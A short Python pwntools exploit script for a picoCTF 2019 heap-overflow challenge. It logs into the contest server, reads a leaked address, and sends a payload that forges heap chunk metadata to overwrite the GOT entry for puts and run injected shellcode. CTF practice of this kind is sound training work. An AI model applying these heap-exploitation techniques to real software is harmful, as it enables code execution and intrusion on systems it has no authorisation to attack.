from pwn import *
from struct import pack


DIR = '/problems/heap-overflow_5_39d709fdc06b81d3c23b73bb9cca6bdb/'
shell = ssh('kscieslinski', '2019shell1.picoctf.com', password='XXXX', port=22)
p = shell.process(DIR + 'vuln', cwd=DIR)
e = ELF('vuln')

p.recvuntil(b'Oops! a new developer copy pasted and printed an address as a decimal...\n')
fullname_addr = int(p.recvline()[:-1])
got_puts_addr = e.symbols['got.puts']

p.recvuntil(b'Input fullname\n')

# we cannot overwrite prevsize of block_a
# we cannot overwrite size of block_a
payload = b'A' * (0x2a0 - 0x8)

# CURRENT BLOCK
payload += b'A' * 4 # block_a was in use
payload += pack('<L', 0x49) # block_a was in use. This block is of size 0x90
payload += p32(got_puts_addr - 12)
payload += p32(fullname_addr + 0x2a0 + 8)
shellcode = b'\xb8\x36\x89\x04\x08\xff\xd0'
payload += shellcode
payload += b'F' * (0x48 - 0x8 - len(shellcode)) # <- this is an address of name

# NEXT BLOCK
payload += pack('<L', 0x48) # cur_block is not in use
payload += pack('<L', 0x10) # just make sure the previous inuse bit is unset


p.sendline(payload)


p.recvuntil(b'Input lastname\n')
p.sendline(b'')

p.stream()


